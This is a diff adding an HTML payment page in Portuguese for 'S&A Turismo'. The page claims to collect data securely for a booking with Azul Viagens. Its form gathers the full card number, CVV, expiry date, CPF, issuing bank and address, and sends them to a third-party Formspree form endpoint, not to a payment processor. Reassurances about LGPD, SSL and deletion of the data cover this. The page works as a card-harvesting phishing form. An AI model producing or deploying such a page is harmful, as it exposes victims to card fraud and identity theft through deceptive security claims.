@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagamento Seguro - S&A Turismo</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body class="bg-gray-50 text-gray-800 font-sans">
+
+    <div class="max-w-3xl mx-auto p-6">
+        
+        <div class="text-center mb-10">
+            <h1 class="text-3xl font-bold text-blue-900 mb-2">S&A Turismo</h1>
+            <p class="text-gray-600">Ambiente Seguro para Processamento de Pagamento</p>
+            <div class="mt-4 p-4 bg-blue-50 border-l-4 border-blue-900 text-left text-sm rounded">
+                <p><strong>Objetivo:</strong> Coleta segura de dados para processamento do pagamento da sua reserva junto à <strong>Azul Viagens</strong>.</p>
+            </div>
+        </div>
+
+        <form action="https://formspree.io/f/mdanbrzp" method="POST" class="bg-white shadow-xl rounded-lg p-8">
+
+            <div class="mb-8 p-4 bg-gray-100 rounded text-xs text-gray-500 text-justify">
+                <h3 class="font-bold text-gray-700 mb-2 uppercase"><i class="fas fa-lock"></i> Segurança da Informação e LGPD</h3>
+                <p class="mb-2">Em conformidade com a Lei Geral de Proteção de Dados (Lei nº 13.709/2018):</p>
+                <ul class="list-disc pl-5 space-y-1">
+                    <li>Os dados serão utilizados exclusivamente para processamento do pagamento.</li>
+                    <li>Nenhuma informação será armazenada, registrada ou reutilizada pela Agência após o processamento.</li>
+                    <li>As informações trafegam em ambiente criptografado (SSL).</li>
+                    <li>Os dados serão descartados imediatamente após a finalização do pagamento na Azul Viagens.</li>
+                </ul>
+            </div>
+
+            <div class="mb-6">
+                <label class="block text-gray-700 font-bold mb-2">Valor Total do Pacote (R$)</label>
+                <input type="text" id="valorPacote" name="valor_pacote" readonly 
+                       class="w-full bg-gray-200 border border-gray-300 text-gray-900 text-lg font-bold rounded py-3 px-4 leading-tight focus:outline-none cursor-not-allowed">
+                <p class="text-xs text-gray-500 mt-1">*Valor preenchido pela agência conforme contrato.</p>
+            </div>
+
+            <hr class="my-8 border-gray-200">
+
+            <h2 class="text-xl font-semibold text-blue-900 mb-4">1. Dados do Titular do Cartão</h2>
+            <div class="grid gap-6 mb-6 md:grid-cols-2">
+                <div class="col-span-2">
+                    <label class="block text-sm font-medium text-gray-700">Nome Completo (como impresso no cartão)</label>
+                    <input type="text" name="nome_titular" required class="mt-1 block w-full border border-gray-300 rounded-md p-2 hover:border-blue-500 focus:ring-blue-500 focus:border-blue-500">
+                </div>
+                <div>
+                    <label class="block text-sm font-medium text-gray-700">CPF do Titular</label>
+                    <input type="text" name="cpf_titular" required placeholder="000.000.000-00" class="mt-1 block w-full border border-gray-300 rounded-md p-2">
+                </div>
+                <div>
+                    <label class="block text-sm font-medium text-gray-700">Telefone (com DDD)</label>
+                    <input type="tel" name="telefone" required placeholder="(XX) 90000-0000" class="mt-1 block w-full border border-gray-300 rounded-md p-2">
+                </div>
+                <div class="col-span-2">
+                    <label class="block text-sm font-medium text-gray-700">E-mail</label>
+                    <input type="email" name="email" required class="mt-1 block w-full border border-gray-300 rounded-md p-2">
+                </div>
+            </div>
+
+            <h2 class="text-xl font-semibold text-blue-900 mb-4 mt-8">2. Dados do Cartão de Crédito</h2>
+            <div class="grid gap-6 mb-6 md:grid-cols-2">
+                <div class="col-span-2">
+                    <label class="block text-sm font-medium text-gray-700">Número do Cartão</label>
+                    <input type="text" name="num_cartao" required placeholder="0000 0000 0000 0000" class="mt-1 block w-full border border-gray-300 rounded-md p-2">
+                </div>
+                <div>
+                    <label class="block text-sm font-medium text-gray-700">Validade (MM/AA)</label>
+                    <input type="text" name="validade" required placeholder="MM/AA" class="mt-1 block w-full border border-gray-300 rounded-md p-2">
+                </div>
+                <div>
+                    <label class="block text-sm font-medium text-gray-700">Código CVV</label>
+                    <input type="text" name="cvv" required placeholder="123" class="mt-1 block w-full border border-gray-300 rounded-md p-2">
+                </div>
+                <div class="col-span-2">
+                    <label class="block text-sm font-medium text-gray-700">Banco Emissor</label>
+                    <input type="text" name="banco_emissor" required placeholder="Ex: Nubank, Bradesco, Itaú" class="mt-1 block w-full border border-gray-300 rounded-md p-2">
+                </div>
+            </div>
+
+            <h2 class="text-xl font-semibold text-blue-900 mb-4 mt-8">3. Endereço de Fatura</h2>
+            <div class="grid gap-6 mb-6">
+                <div>
+                    <label class="block text-sm font-medium text-gray-700">CEP</label>
+                    <input type="text" name="cep" required class="mt-1 block w-1/2 border border-gray-300 rounded-md p-2">
+                </div>
+                <div>
+                    <label class="block text-sm font-medium text-gray-700">Endereço Completo</label>
+                    <input type="text" name="endereco" required placeholder="Rua, Número, Bairro, Cidade - UF" class="mt-1 block w-full border border-gray-300 rounded-md p-2">
+                </div>
+            </div>
+
+            <div class="mt-8 p-4 bg-blue-50 rounded border border-blue-200">
+                <label class="flex items-start">
+                    <input type="checkbox" required class="mt-1 mr-3 h-5 w-5 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
+                    <span class="text-sm text-gray-700 text-justify">
+                        <strong>Declaro que li e estou ciente das informações acima</strong> e autorizo a <strong>S&A Turismo</strong> a utilizar os dados informados exclusivamente para a realização do pagamento da minha reserva junto à Azul Viagens, conforme a Lei Geral de Proteção de Dados (LGPD). Estou ciente que o envio deste formulário não garante a emissão imediata (sujeito à aprovação do cartão).
+                    </span>
+                </label>
+            </div>
+
+            <div class="mt-8 text-center">
+                <button type="submit" class="w-full bg-blue-900 hover:bg-blue-800 text-white font-bold py-4 px-6 rounded-lg transition duration-300 shadow-lg text-lg">
+                    <i class="fas fa-lock mr-2"></i> Enviar Dados de Forma Segura
+                </button>
+                <p class="mt-4 text-xs text-gray-500">A S&A Turismo entrará em contato após a confirmação.</p>
+            </div>
+
+        </form>
+        
+        <footer class="text-center mt-10 text-gray-400 text-sm">
+            &copy; 2024 S&A Turismo. Todos os direitos reservados.
+        </footer>
+
+    </div>
+
+    <script>
+        // Função para pegar parâmetros da URL (ex: ?valor=2500,00)
+        const params = new URLSearchParams(window.location.search);
+        const valor = params.get('valor');
+
+        if (valor) {
+            document.getElementById('valorPacote').value = "R$ " + valor;
+        } else {
+            document.getElementById('valorPacote').value = "Valor sob consulta";
+        }
+    </script>
+</body>
+</html>
